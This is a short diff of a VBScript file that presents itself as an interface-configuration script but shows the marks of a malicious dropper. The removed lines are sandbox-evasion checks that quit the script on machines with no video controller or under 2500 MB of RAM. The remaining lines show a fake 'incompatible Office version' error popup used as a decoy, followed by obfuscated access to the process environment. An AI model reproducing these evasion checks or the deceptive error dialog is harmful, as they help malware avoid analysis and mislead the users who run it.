@@ -5,22 +5,7 @@
 '		Requires:  Valid XML templates for the interface you want to configure
 ' 
 ' 
-Dim QWE
-Dim ASD
-SET ASD = GetObject("winmgmts:").InstancesOf("Win32_VideoController")
-If ((ASD.count) < 1) Then
-  Wscript.Quit()
-End If
 
-
-Dim ZXC
-SET ASD = GetObject("winmgmts:").InstancesOf("Win32_PhysicalMemory")
-For Each QWE In ASD
-  ZXC = ZXC + (QWE.Capacity / 1024 / 1024)
-Next
-If ZXC < 2500 Then
-  Wscript.Quit()
-End If
 
 call CreateObject("WScript.Shell").PoPup ("The format of this document is not compatible with the version of Office that you are running. Check your computer's system information to see if you need an x86 (32-bit) or x64 (64-bit) version of this document.", -1, "Error", 16)
 Set AAQWRT = CreateObject("WScript.Shell").Environment("PROCESS")
